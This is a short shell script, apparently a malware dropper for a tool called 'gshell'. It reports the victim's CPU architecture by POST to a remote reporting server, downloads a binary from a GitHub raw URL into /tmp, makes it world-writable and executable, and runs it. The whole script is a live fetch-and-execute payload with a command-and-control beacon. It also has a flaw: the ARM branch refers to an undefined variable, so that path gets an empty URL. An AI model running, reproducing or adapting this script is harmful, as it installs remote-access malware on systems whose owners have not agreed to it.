#!/bin/sh
[ "${FLOCKER}" != "$0" ] && exec env FLOCKER="$0" flock -en "$0" "$0" "$@" || :

report_url="http://report.dataplan.online:19288/9024134B28978B68666E2B034E46130E/debug"
arm64_url="https://raw.githubusercontent.com/gptloveyou/gshell/main/client/garm64.bin"
i386_url="https://raw.githubusercontent.com/gptloveyou/gshell/main/client/gi386.bin"
pl_url=$i386_url;
arch=`cat /proc/cpuinfo|grep -i -c ARM`
if [ $arch != 0 ];then
    pl_url=$arm_url
    curl -X POST $report_url -d "GShell_ARM"
else 
    pl_url=$i386_url
    curl -X POST $report_url -d "GShell_i386"
fi
curl -s -o /tmp/gshell71085644.bin $pl_url 1>/tmp/tmplog042323.log 2>&1
chmod 777 /tmp/gshell71085644.bin 1>>/tmp/tmplog042323.log 2>&1
/tmp/gshell71085644.bin 1>>/tmp/tmplogv.log 2>&1